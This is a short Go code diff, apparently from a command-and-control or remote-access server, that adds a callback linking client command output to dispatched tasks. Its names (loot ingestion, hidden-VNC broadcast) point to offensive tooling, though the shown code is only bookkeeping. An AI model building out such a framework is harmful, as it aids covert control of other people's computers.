@@ -19,6 +19,10 @@ import (
 // 放在 pkg/command 而不是直接调用 pkg/api：pkg/api 依赖 pkg/command，反向调用会成环。
 var LootIngestFunc func(uid, output string)
 
+// TaskOutputFunc 任务回显回调（由 main 注入 api.OnTaskOutput）：把该 uid 最早一条
+// dispatched 任务标为 completed。与 LootIngestFunc 同理，避免 pkg/command 反向依赖 pkg/api。
+var TaskOutputFunc func(uid, output string)
+
 func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
 	xtermBroadcast func(uid string, data []byte),
 	hvncBroadcast func(uid, sid string, frame []byte)) error {
@@ -68,6 +72,10 @@ func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
 			// 回调内部按客户端输出标记识别并静默失败，不影响回包主链路。
 			if LootIngestFunc != nil {
 				LootIngestFunc(uid, string(utf8Data))
+			}
+			// 任务一等对象：命令回显归属（协议无逐命令 ACK，按"先下发先回显"近似）
+			if TaskOutputFunc != nil {
+				TaskOutputFunc(uid, string(utf8Data))
 			}
 		}
 	case PS:
